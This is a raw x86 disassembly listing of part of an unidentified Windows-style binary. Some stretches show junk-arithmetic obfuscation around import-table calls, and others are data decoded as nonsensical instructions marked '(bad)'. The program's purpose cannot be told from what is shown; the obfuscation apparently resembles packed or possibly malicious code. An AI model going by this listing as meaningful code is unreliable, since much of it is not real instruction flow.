  41729d:	lea    esi,ds:0x277ff22a
  4172a3:	mov    al,0x36
  4172a5:	add    edx,DWORD PTR [edx+0xc]
  4172a8:	push   0xfffffff9
  4172aa:	add    eax,0x52d8a42e
  4172af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172b0:	cdq    
  4172b1:	inc    ebx
  4172b2:	jg     0x417316
  4172b4:	push   0x88f70b6
  4172b9:	lock push eax
  4172bb:	mov    ds:0xb9141c36,al
  4172c0:	inc    eax
  4172c1:	addr16 dec edi
  4172c3:	dec    edi
  4172c4:	mov    ds:0xf98919fd,eax
  4172c9:	cmp    BYTE PTR [eax+0x2449cf85],al
  4172cf:	xor    ah,BYTE PTR [esi+0x1f]
  4172d2:	push   ebp
  4172d3:	daa    
  4172d4:	mov    bl,0x98
  4172d6:	es inc eax
  4172d8:	xchg   ebp,eax
  4172d9:	stos   DWORD PTR es:[edi],eax
  4172da:	inc    ebp
  4172db:	adc    al,0x9e
  4172dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4172de:	int    0xea
  4172e0:	lods   eax,DWORD PTR ds:[esi]
  4172e1:	leave  
  4172e2:	xchg   ebx,eax
  4172e3:	xchg   edx,eax
  4172e4:	mov    dh,0x4f
  4172e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172e7:	nop
  4172e8:	or     al,0x12
  4172ea:	dec    edx
  4172eb:	mov    es,WORD PTR ds:0xebdd90c9
  4172f1:	shl    DWORD PTR [edx],cl
  4172f3:	add    DWORD PTR [edx+0x7],0xce7429ad
  4172fa:	mov    ds:0x5428d1fd,al
  4172ff:	or     DWORD PTR [esi+0x3522c176],esi
  417305:	dec    ebx
  417306:	mov    eax,0x268f7ceb
  41730b:	daa    
  41730c:	lods   eax,DWORD PTR ds:[esi]
  41730d:	fidivr DWORD PTR [edi]
  41730f:	int    0x55
  417311:	jnp    0x417369
  417313:	push   ecx
  417314:	jmp    0x41736f
  417316:	imul   ecx,ecx,0x8925abbb
  41731c:	ins    BYTE PTR es:[edi],dx
  41731d:	scas   al,BYTE PTR es:[edi]
  41731e:	xchg   BYTE PTR [ecx-0x1d7e0f84],dh
  417324:	ficom  WORD PTR [edi+0x6d]
  417327:	std    
  417328:	int3   
  417329:	push   0xfffffff3
  41732b:	and    BYTE PTR [edi+0x7e],dl
  41732e:	xchg   esi,eax
  41732f:	js     0x417378
  417331:	nop
  417332:	adc    ebp,DWORD PTR [esi-0x6c]
  417335:	mov    ch,0x1b
  417337:	adc    al,0x7f
  417339:	push   0x10
  41733b:	retf   
  41733c:	gs in  eax,0x8f
  41733f:	xchg   esp,eax
  417340:	repz icebp 
  417342:	mov    cl,0x9f
  417344:	xchg   DWORD PTR ds:0x2e6e1acc,edi
  41734a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41734b:	psubw  mm5,mm2
  41734e:	mov    edx,0x4424448d
  417353:	mov    DWORD PTR [esp+0xc],eax
  417357:	cmp    DWORD PTR ds:0x4282dd,0x0
  41735e:	mov    DWORD PTR ds:0x428421,edi
  417364:	mov    ecx,0x653d
  417369:	jmp    0x417446
  41736e:	mov    DWORD PTR ds:0x4283c5,0x6fab
  417378:	mov    DWORD PTR ds:0x4283b9,0x3325
  417382:	cmp    DWORD PTR ds:0x4282dd,0x0
  417389:	jl     0x4173a7
  41738f:	push   DWORD PTR [ebp-0x20]
  417392:	push   DWORD PTR [ebp-0xc]
  417395:	call   DWORD PTR ds:0x42e0ec
  41739b:	xor    edi,0x628b
  4173a1:	or     edi,0x2ad9
  4173a7:	and    DWORD PTR ds:0x42850d,edx
  4173ad:	and    ecx,DWORD PTR ds:0x428529
  4173b3:	xor    edi,edi
  4173b5:	add    edi,DWORD PTR ds:0x42845d
  4173bb:	mov    edx,DWORD PTR ds:0x428555
  4173c1:	sub    edi,edx
  4173c3:	or     edi,DWORD PTR [edi+edx*1]
  4173c6:	inc    edx
  4173c7:	cmp    DWORD PTR ds:0x428305,0x0
  4173ce:	mov    DWORD PTR ds:0x428429,0x322b
  4173d8:	mov    DWORD PTR ds:0x428325,0x622c
  4173e2:	mov    edx,DWORD PTR ds:0x4282f5
  4173e8:	mov    DWORD PTR ds:0x42847d,0x673b
  4173f2:	jmp    0x417446
  4173f7:	mov    DWORD PTR ds:0x4282fd,edx
  4173fd:	cmp    DWORD PTR ds:0x428305,0x0
  417404:	jl     0x41742c
  41740a:	push   DWORD PTR [ebp-0x24]
  41740d:	push   0x4281f3
  417412:	call   DWORD PTR ds:0x42e27c
  417418:	sbb    DWORD PTR ds:0x428301,0x4806
  417422:	add    DWORD PTR ds:0x428491,0x48d6
  41742c:	add    edi,0x263
  417432:	xor    DWORD PTR ds:0x428309,0x2f2b
  41743c:	add    DWORD PTR ds:0x428531,0x7768
  417446:	lea    eax,[esp+0x60]
  41744a:	xor    ecx,ecx
  41744c:	or     ecx,DWORD PTR ds:0x4282ed
  417452:	xor    DWORD PTR ds:0x428309,ecx
  417458:	mov    DWORD PTR [esp+0x10],eax
  41745c:	sub    edi,DWORD PTR ds:0x4284ad
  417462:	mov    eax,ds:0x4226b8
  417467:	sbb    DWORD PTR ds:0x428429,edx
  41746d:	mov    eax,DWORD PTR [eax+0x1d8]
  417473:	cmp    DWORD PTR ds:0x42842d,0x0
  41747a:	mov    edi,0x142d
  41747f:	mov    DWORD PTR ds:0x42831d,edi
  417485:	jmp    0x4174dd
  41748a:	not    ecx
  41748c:	cmp    DWORD PTR ds:0x42842d,0x0
  417493:	jg     0x4174bb
  417499:	push   DWORD PTR [ebp-0x1c]
  41749c:	push   0x483b
  4174a1:	call   DWORD PTR ds:0x42e0f0
  4174a7:	and    DWORD PTR ds:0x42849d,0x19ab
  4174b1:	xor    DWORD PTR ds:0x4282f1,0x742c
  4174bb:	add    edx,DWORD PTR ds:0x428509
  4174c1:	sub    DWORD PTR ds:0x428419,0x7d91
  4174cb:	mov    edx,DWORD PTR ds:0x4283cd
  4174d1:	or     DWORD PTR ds:0x428495,edx
  4174d7:	adc    DWORD PTR ds:0x4284a1,ecx
  4174dd:	mov    eax,DWORD PTR [eax]
  4174df:	mov    edi,DWORD PTR ds:0x4284c5
  4174e5:	mov    ecx,DWORD PTR ds:0x428541
  4174eb:	sub    ecx,edi
  4174ed:	or     edi,DWORD PTR [edi+ecx*1]
  4174f0:	mov    ecx,eax
  4174f2:	xor    ecx,0xa5069baf
  4174f8:	xor    edx,edx
  4174fa:	or     edx,DWORD PTR ds:0x4283f9
  417500:	sub    edx,DWORD PTR ds:0x42841d
  417506:	mov    DWORD PTR ds:0x4283f9,edx
  41750c:	xor    eax,0xfffffffe
  41750f:	shl    eax,0x1e
  417512:	and    DWORD PTR ds:0x4282e9,edi
  417518:	shr    ecx,0x2
  41751b:	or     ecx,eax
  41751d:	mov    eax,DWORD PTR [esp+0x10]
  417521:	inc    edx
  417522:	mov    DWORD PTR [eax],ecx
  417524:	xor    edx,edi
  417526:	mov    edi,0xcb79b566
  41752b:	mov    DWORD PTR [esp+0x80],edi
  417532:	mov    DWORD PTR [esp+0x84],esi
  417539:	cmp    DWORD PTR ds:0x4283c5,0x0
  417540:	movzx  ecx,WORD PTR ds:0x4282f5
  417547:	movzx  ecx,BYTE PTR ds:0x4283e9
  41754e:	jmp    0x4175bc
  417553:	not    edx
  417555:	cmp    DWORD PTR ds:0x4283c5,0x0
  41755c:	jb     0x4175ae
  417562:	push   DWORD PTR [ebp-0x20]
  417565:	push   0x1e74
  41756a:	push   0x10b8
  41756f:	push   0x6d55
  417574:	push   DWORD PTR [ebp-0x18]
  417577:	push   DWORD PTR [ebp-0x1c]
  41757a:	call   DWORD PTR ds:0x42e0f4
  417580:	movzx  edx,BYTE PTR ds:0x428531
  417587:	add    edx,DWORD PTR ds:0x428499
  41758d:	mov    DWORD PTR ds:0x428531,edx
  417593:	xor    ecx,ecx
  417595:	xor    ecx,DWORD PTR ds:0x428369
  41759b:	xor    edx,edx
  41759d:	xor    edx,DWORD PTR ds:0x4284e1
  4175a3:	sub    ecx,edx
  4175a5:	sub    ecx,DWORD PTR [ecx+edx*1]
  4175a8:	add    DWORD PTR ds:0x42831d,edx
  4175ae:	xor    DWORD PTR ds:0x428519,ebx
  4175b4:	sbb    DWORD PTR ds:0x4283b5,edx
  4175ba:	adc    edx,ecx
  4175bc:	mov    eax,DWORD PTR [esp+0x80]
  4175c3:	or     edx,edx
  4175c5:	mov    ecx,DWORD PTR [esp+0x84]
  4175cc:	cmp    DWORD PTR ds:0x428429,0x0
  4175d3:	mov    edx,DWORD PTR ds:0x42842d
  4175d9:	mov    DWORD PTR ds:0x4282f9,0x64c4
  4175e3:	mov    edx,DWORD PTR ds:0x4283bd
  4175e9:	jmp    0x417644
  4175ee:	mov    DWORD PTR ds:0x4283e1,0x1a08
  4175f8:	cmp    DWORD PTR ds:0x428429,0x0
  4175ff:	ja     0x417624
  417605:	push   DWORD PTR [ebp-0x1c]
  417608:	call   DWORD PTR ds:0x42e280
  41760e:	sbb    edx,DWORD PTR ds:0x428301
  417614:	adc    DWORD PTR ds:0x4283cd,0x1011
  41761e:	sbb    DWORD PTR ds:0x428485,ebx
  417624:	xor    edx,edx
  417626:	or     edx,DWORD PTR ds:0x4283b5
  41762c:	xor    DWORD PTR ds:0x4284fd,edx
  417632:	add    DWORD PTR ds:0x4283bd,ebx
  417638:	add    edx,0x156e
  41763e:	sub    edx,0x437f
  417644:	shrd   eax,ecx,0x2
  417648:	cmp    DWORD PTR ds:0x4284b1,0x0
  41764f:	mov    edx,0x364f
  417654:	mov    DWORD PTR ds:0x4284a5,0x205c
  41765e:	mov    edx,0xb6f
  417663:	jmp    0x4176bb
  417668:	mov    edx,DWORD PTR ds:0x4284f5
  41766e:	mov    DWORD PTR ds:0x428321,edi
  417674:	cmp    DWORD PTR ds:0x4284b1,0x0
  41767b:	jae    0x4176a7
  417681:	push   DWORD PTR [ebp-0x18]
  417684:	call   DWORD PTR ds:0x42e0f8
  41768a:	sub    DWORD PTR ds:0x4283f9,0x4a16
  417694:	mov    edx,DWORD PTR ds:0x428531
  41769a:	or     DWORD PTR ds:0x428515,edx
  4176a0:	sub    DWORD PTR ds:0x4284fd,ecx
  4176a6:	dec    edx
  4176a7:	dec    edx
  4176a8:	not    DWORD PTR ds:0x4282e1
  4176ae:	movzx  edx,WORD PTR ds:0x4284f5
  4176b5:	sub    DWORD PTR ds:0x4284ad,edx
  4176bb:	shr    ecx,0x2
  4176be:	mov    ecx,DWORD PTR [esp+0x80]
  4176c5:	mov    edx,DWORD PTR [esp+0x84]
  4176cc:	add    DWORD PTR ds:0x4282e5,0x428311
  4176d6:	xor    eax,0x32de6d5d
  4176db:	adc    DWORD PTR ds:0x428315,0x4c3b
  4176e5:	xor    edx,edx
  4176e7:	or     DWORD PTR ds:0x42848d,0x428301
  4176f1:	or     edx,eax
  4176f3:	mov    eax,ds:0x428415
  4176f8:	adc    DWORD PTR ds:0x428521,eax
  4176fe:	mov    eax,ds:0x4226b8
  417703:	or     DWORD PTR ds:0x4283bd,0x4283f1
  41770d:	push   edx
  41770e:	or     DWORD PTR ds:0x4283d5,0x3421
  417718:	push   DWORD PTR [eax+0x19c]
  41771e:	lea    eax,[esp+0x80]
  417725:	push   eax
  417726:	sbb    DWORD PTR ds:0x428301,0x428415
  417730:	shl    ecx,0x1e
  417733:	call   0x411c08
  417738:	or     DWORD PTR ds:0x4283bd,0x889
  417742:	lea    eax,[ebp+0x10]
  417745:	add    DWORD PTR ds:0x4283e5,0x428321
  41774f:	push   eax
  417750:	or     DWORD PTR ds:0x4283c1,0x378
  41775a:	mov    DWORD PTR [esp+0x14],edi
  41775e:	mov    DWORD PTR [esp+0x18],esi
  417762:	add    DWORD PTR ds:0x42851d,0x1c44
  41776c:	lea    eax,[ebp+0xc]
  41776f:	sbb    DWORD PTR ds:0x428515,0x6a60
  417779:	push   eax
  41777a:	adc    DWORD PTR ds:0x428431,0x65f7
  417784:	mov    DWORD PTR [esp+0x18],edi
  417788:	lea    eax,[ebp+0x8]
  41778b:	mov    DWORD PTR [esp+0x1c],esi
  41778f:	sub    DWORD PTR ds:0x428429,0x37c8
  417799:	jmp    0x4179f6
  41779e:	cmp    edx,eax
  4177a0:	retf   
  4177a1:	mov    esp,0x44b9bc3c
  4177a6:	out    0x8d,eax
  4177a8:	push   es
  4177a9:	xchg   edx,eax
  4177aa:	pop    ebp
  4177ab:	push   ebp
  4177ac:	cmp    dl,BYTE PTR [edx-0x413f2105]
  4177b2:	xor    eax,0x98bebec2
  4177b7:	sbb    bh,BYTE PTR [esp+ebx*8-0x1b198052]
  4177be:	adc    BYTE PTR [edx],bh
  4177c0:	(bad)  
  4177c1:	mov    edi,DWORD PTR [edi+0x61]
  4177c4:	sbb    BYTE PTR [edx],cl
  4177c6:	jnp    0x417790
  4177c8:	fcomp  DWORD PTR [ecx]
  4177ca:	int3   
  4177cb:	in     eax,0x13
  4177cd:	cmp    eax,0x3ad9d61b
  4177d2:	push   edx
  4177d3:	addr16 pop esp
  4177d5:	cli    
  4177d6:	or     BYTE PTR [ecx+0xcdb1ed3],ch
  4177dc:	leave  
  4177dd:	test   DWORD PTR [ebx+0x13e5130a],0x1a0834b6
  4177e7:	pop    esp
  4177e8:	add    ecx,DWORD PTR [ecx+0x62dd079]
  4177ee:	outs   dx,DWORD PTR ds:[esi]
  4177ef:	enter  0x7131,0xb1
  4177f3:	push   edx
  4177f4:	pop    ss
  4177f5:	add    esi,DWORD PTR [ecx+eiz*4+0x4c]
  4177f9:	in     eax,dx
  4177fa:	inc    esp
  4177fb:	adc    ch,0xa0
  4177fe:	repz jg 0x417869
  417801:	add    cl,BYTE PTR es:[edx+0x41]
  417805:	push   ds
  417806:	out    dx,al
  417807:	sbb    eax,0x6e4923f5
  41780c:	aam    0x9c
  41780e:	mov    ebp,0xe3fd370
  417813:	push   esp
  417814:	cdq    
  417815:	leave  
  417816:	sub    eax,0xf8426741
  41781b:	push   0x1d2cd72b
  417820:	jnp    0x417877
  417822:	and    ebx,ebp
  417824:	push   ecx
  417825:	jae    0x417851
  417827:	in     eax,0x76
  417829:	mov    WORD PTR [edi-0x63],cs
  41782c:	adc    edi,edi
  41782e:	cmc    
  41782f:	push   esi
  417830:	in     eax,dx
  417831:	mov    cl,bh
  417833:	dec    esi
  417834:	cmp    BYTE PTR [esi],dl
  417836:	ins    BYTE PTR es:[edi],dx
  417837:	test   eax,0x8027fb5c
  41783c:	pop    ebx
  41783d:	out    0x36,eax
  41783f:	inc    ecx
  417840:	mov    dl,0x45
  417842:	xor    dl,BYTE PTR [ecx]
  417844:	xor    ebx,DWORD PTR [eax]
  417846:	inc    edx
  417847:	rol    DWORD PTR [ebp+0xd6af058],0x57
  41784e:	adc    al,0xef
  417850:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417851:	sar    DWORD PTR [ecx+0x2d],0xc2
  417855:	test   edx,0x44af3227
  41785b:	popf   
  41785c:	popf   
  41785d:	out    0x6c,al
  41785f:	mov    eax,0x6cd36355
  417864:	dec    esp
  417865:	out    0x24,al
  417867:	out    0x3,al
  417869:	sar    DWORD PTR [edi],cl
  41786b:	enter  0xdc4a,0xb6
  41786f:	nop
  417870:	cli    
  417871:	clc    
  417872:	sti    
  417873:	pop    edx
  417874:	call   0xb9fc:0xf64b5ae7
  41787b:	push   ebx
  41787c:	scas   eax,DWORD PTR es:[edi]
  41787d:	push   esp
  41787e:	aaa    
  41787f:	or     esi,DWORD PTR [esi+0x6c43954d]
  417885:	lods   al,BYTE PTR ds:[esi]
  417886:	dec    esi
  417887:	xchg   ecx,eax
  417888:	inc    ecx
  417889:	sti    
  41788a:	xor    dl,BYTE PTR [ebx+0x4db4483f]
  417890:	sbb    al,0xef
  417892:	loop   0x4178b0
  417894:	das    
  417895:	ja     0x41789c
  417897:	inc    ebp
  417898:	dec    edi
  417899:	dec    ebp
  41789a:	add    ebx,esi
  41789c:	call   0xd839:0x6623303
  4178a3:	repz lds ebp,FWORD PTR cs:[edx+0x9]
  4178a8:	mov    cl,BYTE PTR [eax]
  4178aa:	shl    BYTE PTR [ebp+ebx*4-0x1e9967bf],0x8
  4178b2:	test   DWORD PTR [esi],0x7710565d
  4178b8:	ins    BYTE PTR es:[edi],dx
  4178b9:	or     eax,0xa45ad682
  4178be:	pop    es
  4178bf:	lea    edi,[esi+0x2]
  4178c2:	dec    ebx
  4178c3:	jp     0x417940
  4178c5:	sub    cl,BYTE PTR [ebp+0x6150001f]
  4178cb:	add    eax,0x5c7422f2
  4178d0:	adc    BYTE PTR [eax],al
  4178d2:	inc    eax
  4178d3:	stc    
  4178d4:	dec    esp
  4178d5:	adc    esi,DWORD PTR [ebp+0x2db3bb16]
  4178db:	dec    ebp
  4178dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178dd:	inc    ebx
  4178de:	mov    dl,0xcc
  4178e0:	ror    ah,0x47
  4178e3:	call   0x7b3d:0xee4e76aa
  4178ea:	iret   
  4178eb:	js     0x4178ab
  4178ed:	xor    ebp,DWORD PTR [ebx]
  4178ef:	fmul   st,st(6)
  4178f1:	fcmovbe st,st(6)
  4178f3:	mov    ebx,0xd138e933
  4178f8:	clc    
  4178f9:	dec    esi
  4178fa:	add    BYTE PTR ds:0x653e3a39,ch
  417900:	call   0x8c22f364
  417905:	repnz retf 
  417907:	mov    cl,0x66
  417909:	adc    al,0x7c
  41790b:	sub    dl,BYTE PTR [edx+0x6d]
  41790e:	sub    eax,0xab07a559
  417913:	adc    DWORD PTR [eax+0x57],esp
  417916:	or     bl,BYTE PTR [ecx-0x35]
  417919:	and    eax,0x88489995
  41791e:	inc    ebp
  41791f:	in     al,dx
  417920:	lds    ebx,FWORD PTR [ebp-0x5822f043]
  417926:	stos   DWORD PTR es:[edi],eax
  417927:	addr16 iret 
  417929:	aad    0x27
  41792b:	xor    edi,ebx
  41792d:	xor    al,0x6d
  41792f:	cmp    eax,0xda3d002b
  417934:	scas   eax,DWORD PTR es:[edi]
  417935:	xchg   ebx,eax
  417936:	jle    0x41797a
  417938:	xor    al,0x52
  41793a:	jmp    0x412bf9a3
  41793f:	mov    al,0xf3
  417941:	imul   esi,ebx,0xffffff88
  417944:	inc    esp
  417945:	fwait
  417946:	xchg   edx,eax
  417947:	fstp   TBYTE PTR [esi-0x14]
  41794a:	inc    edi
  41794b:	fnstenv [esi+0x72998213]
  417951:	(bad)  
  417952:	or     eax,ecx
  417954:	inc    ebx
  417955:	hlt    
  417956:	fs jl  0x417954
  417959:	ds jns 0x417924
  41795c:	jle    0x417934
  41795e:	loope  0x4178ed
  417960:	and    dl,BYTE PTR [ecx-0x6dce6911]
  417966:	mov    dl,0xf5
  417968:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417969:	mov    dh,0x9c
  41796b:	outs   dx,BYTE PTR ds:[esi]
  41796c:	pop    esp
  41796d:	push   es
  41796e:	ror    DWORD PTR [edi],cl
  417970:	sub    ch,BYTE PTR es:[ecx+esi*8+0x5b48669b]
  417978:	pop    edx
  417979:	dec    ebx
  41797a:	pop    es
  41797b:	mov    al,0x6c
  41797d:	outs   dx,DWORD PTR ds:[esi]
  41797e:	(bad)
  417981:	das    
  417982:	adc    edx,DWORD PTR [esi-0x71c01aaf]
  417988:	enter  0x2d82,0x7a
  41798c:	add    al,0x4c
  41798e:	aam    0x12
  417990:	jno    0x417938
  417992:	xor    dl,BYTE PTR [edx-0x29]
  417995:	jle    0x417961
  417997:	mov    bh,bl
  417999:	dec    ecx
  41799a:	and    BYTE PTR [edi],ah
  41799c:	ds popf 
  41799e:	pop    edx
  41799f:	add    al,0x5
  4179a1:	adc    eax,0xd4e352fc
  4179a6:	add    al,0x66
  4179a8:	imul   esp,DWORD PTR [edi+0x7],0x4a1b871c
  4179af:	jmp    0x417969
  4179b1:	gs sub al,0x54
  4179b4:	mov    bh,0xc4
  4179b6:	jmp    0x6a0a:0x38d0f7f8
  4179bd:	and    al,0xae
  4179bf:	jae    0x417a2b
  4179c1:	test   al,0x5a
  4179c3:	mov    edx,0x3e5333ca
  4179c8:	inc    edx
  4179c9:	les    esp,FWORD PTR [ebp-0x3f583b4b]
  4179cf:	test   eax,0xc809a819
  4179d4:	sub    DWORD PTR [ecx+0x2fa8a678],ebx
  4179da:	adc    DWORD PTR [esi+ecx*2+0xd0d9c8b],ebx
  4179e1:	sub    eax,0xd47b673a
  4179e6:	mov    ds:0x4e27b6eb,al
  4179eb:	jbe    0x417a5a
  4179ed:	repnz imul DWORD PTR [edx+0x46]
  4179f1:	push   ds
  4179f2:	dec    eax
  4179f3:	in     al,0xe1
  4179f5:	mov    ds:0x18247c89,al
  4179fa:	adc    DWORD PTR ds:0x428489,0x42831d
  417a04:	jmp    0x417c61
  417a09:	and    BYTE PTR [ecx],al
  417a0b:	fst    QWORD PTR [ecx-0x4b4b4d1d]
  417a11:	jb     0x417a54
  417a13:	sahf   
  417a14:	nop
  417a15:	gs cs ror edi,0x73
  417a1a:	loop   0x4179dc
  417a1c:	mov    esi,0xbebec235
  417a21:	mov    dh,0xb9
  417a23:	(bad)  
  417a24:	ret    
  417a25:	daa    
  417a26:	jecxz  0x4179be
  417a28:	add    cl,BYTE PTR [edi+0x6c45f48b]
  417a2e:	sbb    eax,0x55914454
  417a33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a34:	cli    
  417a35:	mov    bl,0x13
  417a37:	pop    es
  417a38:	sub    DWORD PTR [ecx-0x77],esp
  417a3b:	ss and al,0xa7
  417a3e:	or     bl,BYTE PTR [eax-0x63547a16]
  417a44:	jb     0x417a75
  417a46:	lds    eax,FWORD PTR [esi]
  417a48:	inc    ebp
  417a49:	ret    
  417a4a:	ror    DWORD PTR ds:0x8ced08a9,1
  417a50:	fs je  0x417a83
  417a53:	test   eax,0xd18d3402
  417a58:	je     0x417a8e
  417a5a:	xchg   al,dl
  417a5c:	imul   edi,edx,0xffffffcf
  417a5f:	mov    eax,0x9987ab4e
  417a64:	aam    0xc2
  417a66:	repz gs loope 0x417a60
  417a6a:	mov    al,0x8f
  417a6c:	dec    esi
  417a6d:	cmp    DWORD PTR [edx-0x3f],edi
  417a70:	push   0xa
  417a72:	mov    ?,WORD PTR [esi-0x52fedb4]
  417a78:	je     0x417a07
  417a7a:	xor    ah,BYTE PTR [eax-0x6]
  417a7d:	inc    ebp
  417a7e:	clc    
  417a7f:	push   ss
  417a80:	jmp    0xecc5c4fc
  417a85:	inc    edi
  417a86:	mov    al,0x9e
  417a88:	jbe    0x417a74
  417a8a:	pminsw mm0,QWORD PTR [esi]
  417a8d:	xor    DWORD PTR [esi+0x61bc9a87],eax
  417a93:	dec    ebp
  417a94:	cmp    eax,0x34354bb8
  417a99:	iret   
  417a9a:	ss or  ecx,edi
  417a9d:	push   ebx
  417a9e:	push   0x6fd350ed
  417aa3:	in     eax,0x13
  417aa5:	dec    edx
  417aa6:	outs   dx,DWORD PTR ds:[esi]
  417aa7:	inc    ebx
  417aa8:	outs   dx,DWORD PTR ds:[esi]
  417aa9:	fcmovb st,st(5)
  417aab:	out    0x7a,al
  417aad:	ret    
  417aae:	cmp    al,0xb1
  417ab0:	xor    eax,0x5ec1db6d
  417ab5:	pop    esp
  417ab6:	dec    eax
  417ab7:	xor    eax,0xf25310c3
  417abc:	dec    ecx
  417abd:	mov    edi,0x905c7194
  417ac2:	fsub   QWORD PTR [edi]
  417ac4:	and    DWORD PTR [edi],ebp
  417ac6:	lds    esp,FWORD PTR [eax+0x5d7e7487]
  417acc:	adc    BYTE PTR [edx-0x6c],cl
  417acf:	call   0x74c6b9c4
  417ad4:	test   BYTE PTR [eax-0xe],bl
  417ad7:	mov    ecx,ecx
  417ad9:	cmp    ebp,eax
  417adb:	sbb    eax,0xd1a35c06
  417ae0:	icebp  
  417ae1:	or     ebp,DWORD PTR [edx+0x71]
  417ae4:	jge    0x417b4a
  417ae6:	fwait
  417ae7:	mov    ecx,0x408854e3
  417aec:	mov    edi,0x65490d6d
  417af1:	xor    edi,DWORD PTR [ebx-0x6f]
  417af4:	lds    ebp,FWORD PTR [ebp-0x5742d802]
  417afa:	inc    edx
  417afb:	sub    edi,ebx
  417afd:	jg     0x417ac7
  417aff:	es fs call 0x9623:0x9a2f99d2
  417b08:	test   DWORD PTR [esi-0x47],eax
  417b0b:	jg     0x417b89
  417b0d:	fwait
  417b0e:	xchg   edx,eax
  417b0f:	push   ecx
  417b10:	leave  
  417b11:	lods   eax,DWORD PTR ds:[esi]
  417b12:	test   eax,0x43f0f47b
  417b17:	add    esi,DWORD PTR [edi]
  417b19:	(bad)  
  417b1a:	leave  
  417b1b:	repz adc ah,ch
  417b1e:	aad    0xf9
  417b20:	mov    ds:0x8d9fecaa,al
  417b25:	not    ecx
  417b27:	lea    esi,[ecx-0x5f72bf28]
  417b2d:	mov    WORD PTR [eax-0x6ec9bc04],gs
  417b33:	pop    ecx
  417b34:	push   ebx
  417b35:	dec    ebp
  417b36:	push   ebx
  417b37:	(bad)  [ebp-0x6d]
  417b3a:	xor    eax,0xa641ed60
  417b40:	mov    eax,ecx
  417b42:	lea    eax,[eax]
  417b44:	inc    edx
  417b45:	fwait
  417b46:	mov    eax,0x2eae3bcb
  417b4b:	push   ss
  417b4c:	adc    eax,0xad0ea751
  417b51:	in     al,dx
  417b52:	sbb    al,0xb8
  417b54:	and    al,0x1f
  417b56:	sbb    dl,bh
  417b58:	mov    ecx,DWORD PTR [ebx-0x746a64e]
  417b5e:	mov    DWORD PTR [ebx+ebp*2+0x12],0x85a0ed4b
  417b66:	push   cs
  417b67:	pop    ebp
  417b68:	lods   eax,DWORD PTR ds:[esi]
  417b69:	fst    DWORD PTR [ebp-0x3dfb8898]
  417b6f:	and    eax,0x36998121
  417b74:	stc    
  417b75:	cli    
  417b76:	ds push ax
  417b79:	stos   BYTE PTR es:[edi],al
  417b7a:	inc    ebx
  417b7b:	call   0xc307cc4e
  417b80:	lods   eax,DWORD PTR ds:[esi]
  417b81:	rcl    ebp,cl
  417b83:	popf   
  417b84:	mov    eax,0x941a5548
  417b89:	and    edx,ebp
  417b8b:	scas   al,BYTE PTR es:[edi]
  417b8c:	jmp    0xd244:0x74afc932
  417b93:	(bad)  
  417b94:	adc    bh,dh
  417b96:	jle    0x417c16
  417b98:	retf   0x9bd4
  417b9b:	ins    DWORD PTR es:[edi],dx
  417b9c:	retf   0x2d4f
  417b9f:	mov    edx,0x76762cb6
  417ba4:	daa    
  417ba5:	shr    DWORD PTR [ebx],1
  417ba7:	repz out dx,al
  417ba9:	add    eax,0x44a6aabe
  417bae:	(bad)  
  417baf:	jmp    0xec4d5d6e
  417bb4:	les    ebx,FWORD PTR [ecx-0x51]
  417bb7:	lods   eax,DWORD PTR ds:[esi]
  417bb8:	outs   dx,DWORD PTR ds:[esi]
  417bb9:	push   DWORD PTR [edi+0x65]
  417bbc:	aam    0xdf
  417bbe:	xchg   esp,eax
  417bbf:	sahf   
  417bc0:	inc    ebx
  417bc1:	setne  BYTE PTR ds:0xd9fe5c4
  417bc8:	xor    al,0x88
  417bca:	popa   
  417bcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417bcc:	aaa    
  417bcd:	fcom   QWORD PTR [ecx-0x157466dc]
  417bd3:	arpl   WORD PTR [edi+esi*2+0x4c9efb03],di
  417bda:	inc    eax
  417bdb:	xor    bl,BYTE PTR [edx+0x42b1724a]
  417be1:	inc    esp
  417be2:	pop    edx
  417be3:	pop    edi
  417be4:	call   0x56fb:0x12f06757
  417beb:	inc    ecx
  417bec:	or     ecx,DWORD PTR ds:[ecx]
  417bef:	sar    DWORD PTR [ebp+0x44],cl
  417bf2:	jae    0x417bcd
  417bf4:	sub    DWORD PTR [esi+0x3e],0x6d3a74f3
  417bfb:	fst    st(7)
  417bfd:	fistp  WORD PTR [ebx-0x1]
  417c00:	add    bl,BYTE PTR [eax+0x45]
  417c03:	or     ah,bh
  417c05:	push   esi
  417c06:	push   esp
  417c07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c08:	(bad)  
  417c09:	mov    ds:0x1f7e6959,eax
  417c0e:	fs push edi
  417c10:	jne    0x417c8c
  417c12:	stos   BYTE PTR es:[edi],al
  417c13:	scas   al,BYTE PTR es:[edi]
  417c14:	test   eax,0xd699ea4d
  417c19:	mov    ebx,0x344b85fa
  417c1e:	pop    esp
  417c1f:	je     0x417c42
  417c21:	mov    ecx,ecx
  417c23:	shl    DWORD PTR [eax-0x7],0x13
  417c27:	xchg   edi,eax
  417c28:	(bad)  
  417c29:	stc    
  417c2a:	sub    eax,0x6c5e03ec
  417c2f:	push   ebp
  417c30:	leave  
  417c31:	pop    esp
  417c32:	adc    DWORD PTR [ebx+0x5c746767],edx
  417c38:	push   esp
  417c39:	push   ds
  417c3a:	pusha  
  417c3b:	loopne 0x417cb4
  417c3d:	sbb    eax,0x9623f574
  417c42:	in     al,0x8e
  417c44:	lahf   
  417c45:	pop    ecx
  417c46:	jp     0x417c6f
  417c48:	mov    DWORD PTR [eax-0x3adadff5],0x76f398d5
  417c52:	pop    edi
  417c53:	pop    ds
  417c54:	and    DWORD PTR [eax+0x28],0x61ea9f2c
  417c5b:	int    0xea
  417c5d:	sub    edx,esp
  417c5f:	jmp    0x811c:0x24748927
  417c66:	add    eax,0x4283e5
  417c6b:	aam    0x4d
  417c6d:	add    BYTE PTR [eax],al
  417c6f:	push   eax
  417c70:	and    DWORD PTR ds:0x42852d,0x2c3a
  417c7a:	call   0x40a112
  417c7f:	and    DWORD PTR ds:0x4283ed,0x42842d
  417c89:	push   0x4
  417c8b:	push   0x42253c
